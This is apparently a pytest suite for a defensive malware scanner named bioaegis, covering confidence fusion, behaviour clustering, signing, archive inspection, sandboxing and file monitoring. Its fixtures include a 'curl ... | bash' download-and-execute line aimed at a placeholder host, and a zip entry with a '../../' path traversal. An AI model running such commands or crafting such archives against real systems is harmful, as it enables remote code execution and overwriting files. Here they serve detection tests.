from pathlib import Path


def test_confidence_fuses_independent_evidence():
    from bioaegis.confidence import fuse

    result = fuse(frozenset({"download-and-execute", "reverse-shell"}), external_hits=1)
    assert result.score >= 45
    assert result.level in {"MEDIUM", "HIGH"}


def test_behavior_clustering_groups_similar_observations():
    from bioaegis.behavior import cluster, similarity

    items = [
        frozenset({"network", "reverse-shell"}),
        frozenset({"network", "reverse-shell", "executable"}),
        frozenset({"persistence"}),
    ]
    assert similarity(items[0], items[1]) > 0.5
    assert cluster(items, threshold=0.5)[0] == [0, 1]


def test_integrity_signature_detects_tampering(tmp_path):
    from bioaegis.integrity import sign, verify

    key = tmp_path / "key"
    payload = b"validated policy\n"
    signature = sign(payload, key)
    assert verify(payload, signature, key)
    assert not verify(payload + b"tampered", signature, key)


def test_archive_scanner_detects_path_traversal(tmp_path):
    import zipfile

    from bioaegis.archive_scanner import inspect

    archive = tmp_path / "fixture.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("../../escape.txt", "fixture")
    assert "archive-path-traversal" in inspect(str(archive))


def test_archive_scanner_detects_script_pattern_without_extracting(tmp_path):
    import zipfile

    from bioaegis.archive_scanner import inspect

    archive = tmp_path / "fixture.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("run.sh", "curl https://example.invalid/a | bash\n")
    assert "archive-download-execute" in inspect(str(archive))


def test_sandbox_manifest_disables_execution(tmp_path):
    from bioaegis.sandbox import AnalysisSandbox

    manifest = AnalysisSandbox(tmp_path / "sandbox").create(tmp_path / "sample")
    data = manifest.read_text(encoding="utf-8")
    assert '"execution": "disabled"' in data
    assert '"network": "disabled"' in data


def test_specialist_provider_contract():
    from bioaegis.specialist_api import DeterministicSpecialistProvider, SpecialistProvider

    assert issubclass(DeterministicSpecialistProvider, SpecialistProvider)


def test_realtime_monitor_can_watch_temp_directory(tmp_path):
    from bioaegis.realtime import InotifyMonitor

    try:
        with InotifyMonitor(tmp_path) as monitor:
            sample = Path(tmp_path) / "event.txt"
            sample.write_text("fixture", encoding="utf-8")
            events = monitor.poll(timeout=1.0)
    except OSError:
        return
    assert sample in events or any(item.name == "event.txt" for item in events)
